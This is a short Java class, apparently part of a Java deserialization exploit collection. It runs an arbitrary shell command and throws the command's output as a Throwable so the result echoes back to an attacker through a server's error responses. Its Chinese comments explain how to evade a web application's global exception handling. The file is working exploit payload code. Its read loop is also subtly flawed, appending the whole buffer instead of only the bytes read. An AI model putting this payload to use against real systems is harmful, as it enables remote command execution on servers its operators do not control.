package com.threedr3am.bug.collections.v3.no2;

import java.io.BufferedInputStream;

/**
 * 抛异常回显执行命令
 *
 * Created by threedr3am on 2018/5/5.
 */
public class CallbackRuntime {
    public void exec(String cmd) throws Throwable {
        BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        StringBuilder stringBuilder = new StringBuilder();
        byte[] bytes = new byte[4096];
        int len = 0;
        while ((len = bufferedInputStream.read(bytes)) != -1)
            stringBuilder.append(new String(bytes));
        //此处最好不要使用Exception异常类，因为很多web项目可能会全局捕获该异常
        throw new Throwable(stringBuilder.toString());
    }
}
